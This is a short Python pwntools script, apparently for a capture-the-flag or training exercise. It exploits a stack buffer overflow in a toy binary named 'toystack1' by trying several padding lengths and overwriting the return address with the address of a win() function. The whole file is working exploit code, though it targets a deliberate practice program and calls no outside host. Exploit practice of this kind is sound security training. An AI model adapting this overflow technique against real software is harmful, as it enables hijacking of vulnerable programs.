from pwn import *

# Load the binary
binary = ELF('./toystack1')
context.binary = binary
context.log_level = 'debug'

# Start the process
io = process(binary.path)

# Address of win() function
win_address = binary.symbols['win']
print(f"Address of win() function: {hex(win_address)}")

# Try different buffer sizes
buffer_sizes = [1480, 1484, 1488, 1500]

for buffer_size in buffer_sizes:
    print(f"\nTrying buffer size: {buffer_size}")
    
    # Restart the process
    io = process(binary.path)
    
    # Construct payload
    payload = b'A' * buffer_size + p32(win_address)
    print(f"Payload length: {len(payload)}")

    try:
        # Send the payload
        io.send(payload)
        
        # Try to receive output
        output = io.recvall(timeout=2)
        print("Output received:")
        print(output.decode(errors='ignore'))
        
        # If we get here without an exception, we might have succeeded
        break
    
    except Exception as e:
        print(f"Error with buffer size {buffer_size}: {e}")
    finally:
        # Close the process
        io.close()